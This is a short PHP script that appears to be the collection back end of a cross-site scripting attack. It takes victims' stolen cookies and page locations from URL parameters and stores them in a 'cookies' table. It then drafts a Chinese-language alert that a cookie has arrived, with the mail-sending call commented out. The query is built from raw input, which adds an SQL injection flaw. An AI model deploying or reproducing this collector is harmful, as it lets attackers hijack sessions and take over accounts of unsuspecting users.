<?php
$conn = mysql_connect(MYSQL_HOST.':'.MYSQL_PORT,MYSQL_USER,MYSQL_PASS);



$opener = $_GET['opener'];
$toplocation = $_GET['toplocation'];
$location = $_GET['location'];
$cookie = $_GET['cookie'];

$sql = "INSERT INTO cookies (location,cookie,toplocation,opener) VALUES ('".$location."', '".$cookie."', '".$toplocation."', '".$opener."')";

mysql_select_db(XSS_DB, $conn);
mysql_query($sql, $conn);
mysql_close($conn);


$title = '亲，您的cookie 到了~';
$content = '您的cookie 到了~
猛戳此处查看：http://www.57987.com';
//$mail = new SaeMail();
//$ret = $mail->quickSend( '收信邮箱' , $title, $content, '发信邮箱' , '发信邮箱密码' );
 
//发送失败时输出错误码和错误信息
if ($ret === false)
    var_dump($mail->errno(), $mail->errmsg());


?>